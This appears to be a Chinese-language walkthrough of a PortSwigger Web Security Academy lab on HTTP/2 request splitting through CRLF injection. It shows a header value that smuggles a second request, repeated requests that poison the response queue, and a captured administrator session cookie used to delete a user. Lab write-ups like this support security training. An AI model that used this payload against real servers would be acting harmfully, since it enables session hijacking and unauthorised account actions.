# 实验：通过 CRLF 注入实现 HTTP/2 请求拆分

本实验容易受到请求走私的攻击，因为前端服务器会对 HTTP/2 请求进行降级，且未能充分清理传入的头部。

要解决本实验，使用[响应队列投毒](/web-security/request-smuggling/advanced/response-queue-poisoning)闯入 `/admin` 下的管理面板，删除用户 `carlos`。管理员用户大约每 10 秒登录一次。

与后端的连接每 10 个请求重置一次，因此如果连接进入不良状态，不必担心——只需发送几个正常请求即可获得新连接。

> **提示**
>
> 要向 HTTP/2 头部注入换行符，请使用 Inspector 下钻到头部，然后按下 `Shift + Enter` 键。请注意，当您双击头部时，此功能不可用。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: 0a8000c7044763a180cf3f0700d000a4.web-security-academy.net
    Cookie: session=YD5MbJWr0rvnVoYeYzI1pI2WvXiiBcs4


    ```

- 使用搜索功能
    ```http
    POST / HTTP/2
    Host: 0a8000c7044763a180cf3f0700d000a4.web-security-academy.net
    Cookie: session=YD5MbJWr0rvnVoYeYzI1pI2WvXiiBcs4

    search=test
    ```

    - 服务器响应
        ```html
        <h1>
            3 search results for 'test'
        </h1>
        ```
        - 存在输入反射


尝试在头部设置队列投毒载荷
- 编辑 HTTP2 的头部，新增字段
    - `foo`:
        ```
        bar
        Host: 0a8000c7044763a180cf3f0700d000a4.web-security-academy.net

        GET /404 HTTP/1.1
        ```
        - 在头的值中设置攻击请求的 Host，预期由前端服务器在最后的被走私请求中添加 Host

- 攻击器设置自动发送 NULL 类型的普通请求，重复器手动发送攻击请求
    - 其中一个响应
        ```http
        HTTP/2 404 Not Found
        Content-Type: application/json; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 11

        "Not Found"
        ```
    - 确认队列投毒漏洞存在

- 继续执行，直到出现其他用户的请求
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=administrator
    Set-Cookie: session=FPVUajDDZuazdkch5pbn8KSwqHbOdFp5; Secure; HttpOnly; SameSite=None
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0


    ```

- 使用窃取的管理员会话 cookie 成功访问账户页面，并执行删除功能
